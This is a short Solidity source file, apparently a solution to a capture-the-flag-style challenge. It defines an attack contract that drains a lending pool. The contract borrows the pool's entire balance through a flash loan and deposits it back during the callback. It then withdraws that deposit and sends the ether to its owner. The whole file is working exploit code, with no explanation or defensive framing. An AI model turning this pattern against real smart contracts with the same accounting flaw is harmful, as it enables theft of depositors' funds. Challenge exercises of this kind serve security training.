// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    
    address owner;
    SideEntranceLenderPool pool;

    constructor() {
        owner = msg.sender;
    }

    function execute() external payable override {
        pool.deposit{value: address(this).balance}();
    }

    function requestFlashLoan(SideEntranceLenderPool _pool) external payable {
        pool = _pool;
        pool.flashLoan(address(pool).balance);
        
        pool.withdraw();
        (bool result, ) = owner.call{value: address(this).balance}("");
        require(result);
    }

    receive() external payable {

    }

}